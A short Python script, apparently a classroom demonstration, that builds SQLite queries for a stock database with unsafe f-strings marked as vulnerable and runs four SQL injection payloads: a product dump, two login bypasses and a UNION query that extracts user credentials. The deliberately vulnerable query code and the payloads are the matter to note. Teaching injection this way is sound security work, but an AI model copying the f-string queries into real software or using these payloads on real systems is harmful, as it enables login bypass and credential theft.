import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    # VULNERABLE: Using f-string directly
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'Query: {query}')
    rows = conn.execute(query).fetchall()
    print(f'Result: {rows}\n')
    return rows

def login(username, password):
    # VULNERABLE: Using f-string directly
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'Query: {query}')
    row = conn.execute(query).fetchone()
    print(f'Result: {row}\n')
    return row

# ATTACK 1: Dump all products
print("=== ATTACK 1: Dump all products ===")
search_product("' OR 1=1--")

# ATTACK 2: Login bypass with no password
print("=== ATTACK 2: Login bypass ===")
login("admin'--", "anything")

# ATTACK 3: Always true login
print("=== ATTACK 3: Always true login ===")
login("' OR '1'='1", "' OR '1'='1")

# ATTACK 4: UNION attack to steal user data
print("=== ATTACK 4: UNION attack - steal user credentials ===")
search_product("' UNION SELECT id, username, password, role FROM users--")

conn.close()